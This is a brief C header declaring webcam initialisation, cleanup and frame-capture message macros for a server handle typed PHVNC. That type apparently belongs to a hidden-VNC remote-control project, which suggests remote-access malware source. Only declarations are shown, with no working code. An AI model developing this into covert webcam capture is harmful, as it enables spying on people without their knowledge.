#ifndef WEBCAM_H_INCLUDED
#define WEBCAM_H_INCLUDED

#define WM_CAM_PAUSE     WM_USER+1
#define WM_CAM_START     WM_USER+2
#define WM_CAM_NEXTFRAME WM_USER+3

#define CamGetFrame(lpServer) CamSendMessage(lpServer,WM_CAM_NEXTFRAME)
#define CamStopCapture(lpServer) CamSendMessage(lpServer,WM_CAM_PAUSE)
#define CamStartCapture(lpServer) CamSendMessage(lpServer,WM_CAM_START)

BOOL InitWebCam(PHVNC lpServer);
void CamCleanup(PHVNC lpServer);

void CamSendMessage(PHVNC lpServer,DWORD dwMsg);

#endif // WEBCAM_H_INCLUDED
